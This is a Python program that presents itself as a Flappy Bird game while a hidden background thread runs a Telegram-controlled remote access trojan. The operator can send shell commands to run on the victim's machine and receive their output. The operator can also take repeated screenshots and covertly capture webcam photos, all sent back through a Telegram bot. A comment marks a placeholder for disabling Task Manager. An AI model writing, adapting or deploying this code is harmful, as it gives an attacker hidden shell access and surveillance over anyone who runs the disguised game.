import re
import cv2
import socket
import threading
import random
import pyautogui as pg
from telepot.loop import MessageLoop
import subprocess as sb
from time import sleep
import telepot
import os
import subprocess as sb
import webbrowser
#from P_LIBS.config import TOKEN, OWNER
from pprint import pprint
from datetime import datetime
import pygame, sys #for flappy

import json

with open("config.json", "r") as config:
    cred = json.load(config)
    OWNER = int(cred["owner_id"])
    TOKEN = cred["token"]

#FLAPPY CODE
def flappybird_exe_as_fuck():

    def draw_floor():
            screen.blit(floor_surface,(floor_x_position,900))
            screen.blit(floor_surface,(floor_x_position + 576,900))

    def create_pipe():
            random_pipe_position = random.choice(pipe_height)
            bottom_pipe = pipe_surface.get_rect(midtop = (700,random_pipe_position))
            top_pipe = pipe_surface.get_rect(midbottom = (700,random_pipe_position-300))
            return bottom_pipe, top_pipe

    def move_pipes(pipes):
            for pipe in pipes:
                    pipe.centerx -= 5
            return pipes

    def draw_pipes(pipes):
            for pipe in pipes:
                    if pipe.bottom >= 1024:
                            screen.blit(pipe_surface, pipe)
                    else:
                            flip_pipe = pygame.transform.flip(pipe_surface, False, True)
                            screen.blit(flip_pipe, pipe)

    def check_collision(pipes):
            for pipe in pipes:
                    if bird_rectangle.colliderect(pipe):
                            death_sound.play()
                            return False


            if bird_rectangle.top <= -100 or bird_rectangle.bottom >= 900:
                    return False

            return True

    def rotate_bird(bird):
            new_bird = pygame.transform.rotozoom(bird, -bird_movement*3, 1)
            return new_bird

    def bird_animation():
            new_bird = bird_frames[bird_index]
            new_bird_rectangle = new_bird.get_rect(center = (100, bird_rectangle.centery))
            return new_bird, new_bird_rectangle

    def score_display(game_state):
            if game_state == 'main_game':
                    score_surface = game_font.render(str(int(score)), True, (255,255,255))
                    score_rectangle = score_surface.get_rect(center = (288, 100))
                    screen.blit(score_surface, score_rectangle)

            if game_state == 'game_over':
                    score_surface = game_font.render(f'Score: {int(score)}', True, (255,255,255))
                    score_rectangle = score_surface.get_rect(center = (288, 100))
                    screen.blit(score_surface, score_rectangle)

                    high_score_surface = game_font.render(f'High Score: {int(high_score)}', True, (255,255,255))
                    high_score_rectangle = high_score_surface.get_rect(center = (288, 185))
                    screen.blit(high_score_surface, high_score_rectangle)

    def update_score(score, high_score):
            if score > high_score:
                    high_score = score
            return high_score


    #function to initialize (init()) pygame
    pygame.mixer.pre_init(frequency = 44100, size = 16, channels = 1, buffer = 512)
    pygame.init()
    screen = pygame.display.set_mode((576,1024))
    clock = pygame.time.Clock()
    game_font = pygame.font.Font('./assets/04B_19.TTF',40)

    # variables for the game
    gravity = 0.25
    bird_movement = 0
    game_active = True
    global score
    score = 0
    high_score = 0

    # this one would also work
    # background_surface = pygame.transform.scale2x(pygame.image.load('assets/background-day.png'))

    background_surface = pygame.image.load('assets/background-day.png').convert()
    background_surface = pygame.transform.scale2x(background_surface)

    floor_surface = pygame.image.load('assets/base.png').convert()
    floor_surface = pygame.transform.scale2x(floor_surface)
    floor_x_position = 0

    bird_downflap = pygame.transform.scale2x(pygame.image.load('assets/bluebird-midflap.png').convert_alpha())
    bird_midflap = pygame.transform.scale2x(pygame.image.load('assets/bluebird-midflap.png').convert_alpha())
    bird_upflap = pygame.transform.scale2x(pygame.image.load('assets/bluebird-midflap.png').convert_alpha())
    bird_frames = [bird_downflap, bird_midflap, bird_upflap]
    bird_index = 0
    bird_surface = bird_frames[bird_index]
    bird_rectangle = bird_surface.get_rect(center = (100,512))

    BIRDFLAP = pygame.USEREVENT + 1
    pygame.time.set_timer(BIRDFLAP, 200)

    # bird_surface = pygame.image.load('assets/bluebird-midflap.png').convert_alpha()
    # bird_surface = pygame.transform.scale2x(bird_surface)
    # bird_rectangle = bird_surface.get_rect(center = (100,512))

    pipe_surface = pygame.image.load('assets/pipe-green.png')
    pipe_surface = pygame.transform.scale2x(pipe_surface)
    pipe_list = []
    SPAWNPIPE = pygame.USEREVENT
    pygame.time.set_timer(SPAWNPIPE, 1200) # event triggered every 1.2 seconds
    pipe_height = [400, 600, 800]

    game_over_surface = pygame.transform.scale2x(pygame.image.load('assets/message.png').convert_alpha())
    game_over_rectangle = game_over_surface.get_rect(center = (288,512))

    flap_sound = pygame.mixer.Sound('sound/sfx_wing.wav')
    death_sound = pygame.mixer.Sound('sound/sfx_hit.wav')
    score_sound = pygame.mixer.Sound('sound/sfx_point.wav')
    score_sound_countdown = 100


    while True:
            for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                            pygame.quit()
                            sys.exit()

                    if event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_SPACE and game_active:
                                    bird_movement = 0
                                    bird_movement -= 10
                                    flap_sound.play()

                            if event.key == pygame.K_SPACE and game_active == False:
                                    game_active = True
                                    pipe_list.clear()
                                    bird_rectangle.center = (100, 512)
                                    bird_movement = 0
                                    score = 0


                    if event.type == SPAWNPIPE:
                            pipe_list.extend(create_pipe())

                    if event.type == BIRDFLAP:
                            if bird_index < 2:
                                    bird_index += 1
                            else:
                                    bird_index = 0

                            bird_surface, bird_rectangle = bird_animation()

            screen.blit(background_surface,(0,0))

            if game_active:
                    # bird movement
                    bird_movement += gravity
                    rotated_bird = rotate_bird(bird_surface)
                    bird_rectangle.centery += bird_movement
                    screen.blit(rotated_bird, bird_rectangle)
                    game_active = check_collision(pipe_list)


                    # pipes
                    pipe_list = move_pipes(pipe_list)
                    draw_pipes(pipe_list)

                    score += 0.01
                    score_display('main_game')
                    score_sound_countdown -= 1
                    if score_sound_countdown <= 0:
                            score_sound.play()
                            score_sound_countdown = 100

            else:
                    screen.blit(game_over_surface, game_over_rectangle)
                    high_score = update_score(score, high_score)
                    score_display('game_over')


            #Floor
            floor_x_position -= 1
            draw_floor()
            if floor_x_position <= -576:
                    floor_x_position = 0


            pygame.display.update()
            clock.tick(120)
            
#END OF FLAPPY CODE   

#variables..

alpha = "abcdefghijklmnopqrstuvwxyz"
integers = "1234567890"

now = datetime.now()

current_time = now.strftime("%H:%M:%S")

bot = telepot.Bot(TOKEN)

usr = sb.run("echo %USERPROFILE%",shell=True, stdout=sb.PIPE, stderr=sb.PIPE, encoding="utf-8").stdout.replace('\n', '')

#functions...

def selphie():

    filename = str(random.randint(10000, 99999999)) + ".jpg"

    camera = cv2.VideoCapture(0)

    return_value, image = camera.read()
    cv2.imwrite(filename, image)
    del(camera)

    bot.sendPhoto(OWNER, open(filename, "rb"))

    os.remove(filename)

def find_numberz(_string):

        emp_str = ""
        for m in _string:
                if m.isdigit():
                        emp_str = emp_str + m
        return emp_str

def has_numbers(inputString):
    return any(char.isdigit() for char in inputString)

def bsend(message):
    bot.sendMessage(OWNER, message)

def no_task_for_you():
    pass #disable task manager

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    text = msg['text']

    if content_type == "text" and not chat_id == OWNER:
        bsend(text + current_time)
        bot.sendMEssage(chat_id, "Only the owner can talk to me")

    elif content_type == "text" and chat_id == OWNER:
        if text == "/start":
            bsend("WELCOME BACK")

        elif text.startswith("$"):

            cmd = text.replace("$", "")

            ecmd = sb.run(cmd, shell=True, stdout=sb.PIPE, stderr=sb.PIPE, encoding='utf-8')
            
            output = ecmd.stdout + ecmd.stderr

            if output == "":
                output = "None"

            try:
                bsend(f"Ouput : {output}")
            except telepot.exception.TelegramError:
                bsend("Error while sending output")
            
        elif text == "screenshot":
            
            filename = str(random.randint(10000, 99999999)) + ".jpg"

            screenshot = pg.screenshot()
            screenshot.save(r"{}/{}".format(usr, filename))

            bot.sendPhoto(OWNER, open(r"{}/{}".format(usr, filename), "rb"))

        elif text.startswith("screenshot") and has_numbers(text):
            
            times = find_numberz(text)

            for _ in range(int(times)):

                filename = str(random.randint(10000, 99999999)) + ".jpg"

                sleep(3)

                screenshot = pg.screenshot()
                screenshot.save(r"{}/{}".format(usr, filename))

                bot.sendPhoto(OWNER, open(r"{}/{}".format(usr, filename), "rb"))

                os.remove(r"{}/{}".format(usr, filename))

        elif text == "photo" or text == "selphie":
                selphie()
        
        elif text.startswith("msg"):
            pg.alert(text.replace('msg ', ''))
    else:
        bsend("What the actual fuck have I have to do?")

bsend( f"Bot Activated {current_time}")

def main():
    MessageLoop(bot, handle).run_as_thread()

flappybird__ = threading.Thread(target=flappybird_exe_as_fuck)
shell = threading.Thread(target=main)

if __name__ == "__main__":

    dir_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(dir_path)

    flappybird__.start()
    shell.start()

    while 1:
       sleep(0.5)
